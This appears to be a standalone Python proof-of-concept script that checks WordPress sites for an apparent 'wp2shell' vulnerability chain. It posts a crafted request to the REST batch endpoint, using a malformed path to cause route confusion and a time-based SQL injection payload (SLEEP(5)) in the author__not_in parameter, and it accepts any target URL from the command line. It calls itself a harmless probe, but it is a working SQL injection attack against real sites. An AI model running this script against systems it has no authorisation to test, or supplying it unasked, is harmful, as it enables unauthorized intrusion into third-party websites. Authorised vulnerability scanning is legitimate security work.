import requests
import json
import sys
import time  # Added missing import for time
from urllib.parse import urljoin

def check_wp2shell(target_url):
    """
    Checks if a target WordPress site is vulnerable to the wp2shell chain.
    This script only sends probe requests and does not perform any exploitation
    or data extraction.
    """
    # Construct a malicious batch request to trigger route confusion and SQL injection probing
    # The 'author__not_in' parameter injects a harmless time-based probe payload
    payload = {
        "requests": [
            {
                "path": "/wp/v2/posts"
            },
            {
                # This path is used to trigger route confusion
                "path": "http://:"
            },
            {
                # This request will be misrouted to the /wp/v2/posts handler due to confusion
                # Simultaneously, it injects a probe via the author__not_in parameter
                "path": "/wp/v2/categories",
                "body": json.dumps({
                    "author__not_in": "1) AND (SELECT 1 FROM (SELECT SLEEP(5))a) -- -"
                }),
                "method": "GET"
            }
        ]
    }

    batch_url = urljoin(target_url, "/wp-json/batch/v1")
    headers = {'Content-Type': 'application/json'}

    try:
        print(f"[*] Checking target: {batch_url}")
        start_time = time.time()
        response = requests.post(batch_url, json=payload, headers=headers, timeout=15)
        elapsed_time = time.time() - start_time

        # Check response status code and response time
        if response.status_code == 200:
            # If response time is significantly greater than 5 seconds, a time-based SQL injection may exist
            if elapsed_time > 5:
                print("[!] Target may be vulnerable (detected time-based SQL injection delay)!")
                return True
            else:
                print("[-] No obvious vulnerability signs detected.")
                return False
        else:
            print(f"[-] Request failed with status code: {response.status_code}")
            return False

    except requests.exceptions.Timeout:
        # A timeout may also indicate that the SQL injection SLEEP took effect
        print("[!] Target may be vulnerable (request timed out, possibly due to SQL injection delay)!")
        return True
    except Exception as e:
        print(f"[-] An error occurred during detection: {e}")
        return False

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python check_wp2shell.py <target_url>")
        print("Example: python check_wp2shell.py http://example.com")
        sys.exit(1)
    
    target = sys.argv[1]
    check_wp2shell(target)